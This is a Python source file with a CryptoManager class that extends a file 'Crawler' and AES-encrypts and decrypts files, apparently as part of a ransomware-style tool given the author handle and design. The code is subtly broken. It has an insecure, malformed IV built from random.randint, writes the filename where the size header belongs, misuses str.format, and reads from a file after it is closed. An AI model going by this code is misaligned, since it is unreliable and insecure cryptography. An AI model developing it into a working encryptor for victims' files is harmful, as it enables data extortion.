#!/usr/bin/env python
__author__ = "T0x1cEnv31ope"
import os
import platform
import random
from main.xsys.crawlers import Crawler
#from Crypto.Hash import SHA256
from Crypto.Cipher import AES


class CryptoManager(Crawler):
    """
        [Description]
        __init__
        - Construct a Crawler Object
    """
    def __init__(self):
        super(CryptoManager, self).__init__()

    """
        [Description]
        clear_console
        - Clear the screen according to the running OS 
         
        :returns -> lambda execution of os.command::clear_screen
    """
    @staticmethod
    def clear_console():
        p = platform.platform()
        if p.startswith('Win') or p.startswith('win'):
            win = lambda: os.system('cls')
            return win()
        elif p.startswith('Lin') or p.startswith('lin'):
            lin = lambda: os.system('clear')
            return lin()
        else:
            drw = lambda: os.system('clear')
            return drw()

    """
        [Description]
        encrypt
        - Encrypt a given file by a given key
        :param -> key:str - a key for encryption
        :param -> filename:file - a given file to be encrypt
    """
    def encrypt(self, key, filename):
        out_file = os.path.join(os.path.dirname(filename), self.SUFFIX+os.path.basename(filename))
        file_size = str.format(os.path.getsize(filename)).zfill(self.SIXTEEN_BYTES)
        iv = ''
        for i in range(self.SIXTEEN_BYTES):
            iv += chr.__format__(random.randint(0, 0xFF))
        encrypter = AES.new(key, AES.MODE_CBC, iv)
        with open(filename, 'rb') as infile:
            with open(out_file, 'wb') as outfile:
                outfile.write(filename)
                outfile.write(iv)
                while True:
                    chunk = infile.read(self.CHUNK_SIZE)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % self.SIXTEEN_BYTES != 0:
                        chunk += ' '*(self.SIXTEEN_BYTES - (len(chunk) % self.SIXTEEN_BYTES))
                    elif len(chunk) != file_size:
                        outfile.write(encrypter.encrypt(chunk))
                    else:
                        break
                outfile.close()

    """
        [Description]
        decrypt
        - Decrypt a file content given a key 
        :param -> key:str - a key for decryption
        :param -> filename:file - a given encrypted file
    """
    def decrypt(self, key, filename):
        out_file = os.path.join(os.path.basename(filename), os.path.basename(filename[12:]))
        with open(filename, 'rb') as infile:
            file_size = infile.read(self.SIXTEEN_BYTES)
            iv = infile.read(self.SIXTEEN_BYTES)
        decrypter = AES.new(key, AES.MODE_CBC, iv)
        with open(out_file, 'wb') as outfile:
            while True:
                chunk = infile.read(self.CHUNK_SIZE)
                if len(chunk) == 0:
                    break
                outfile.write(decrypter.decrypt(chunk))
            outfile.truncate(int(file_size))


if __name__ == '__main__':
    c = CryptoManager()
